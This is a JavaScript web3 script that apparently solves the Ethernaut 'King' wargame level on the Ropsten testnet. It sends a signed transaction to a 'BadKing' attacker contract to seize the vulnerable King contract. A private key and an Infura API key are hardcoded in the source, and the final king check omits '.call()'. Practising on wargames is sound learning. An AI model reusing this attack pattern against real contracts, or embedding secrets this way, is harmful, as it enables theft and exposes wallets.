import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/BadKing.json')));
const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/King.json')));
const address = '0x1fb863f8E39b3da64aA97e0aC40B0798d667868e';
const solAddress = solArtifact.networks['3'].address;
debugEthernaut('solAddress', solAddress);
const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
const contract = new web3.eth.Contract(artifact.abi, address);

const ethernaut = async () => {
  try {
    const ether = web3.utils.toWei('1');
    debugEthernaut('1 ether to wei', ether);
    const estimatedGas = await solContract.methods.dethroneKing(ether).estimateGas();
    debugEthernaut('estimated gas', estimatedGas);
    const transactionData = await solContract.methods.dethroneKing(ether).encodeABI();
    debugEthernaut('data', transactionData);
    const transaction = {
      from: account.address,
      to: solAddress,
      data: transactionData,
      gasLimit: estimatedGas * 100,
      // gasPrice: utils.toWei(20, 'Gwei'),
    };

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);

    // Check result
    const newKing = await contract.methods._king();
    debugEthernaut('newKing', newKing);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
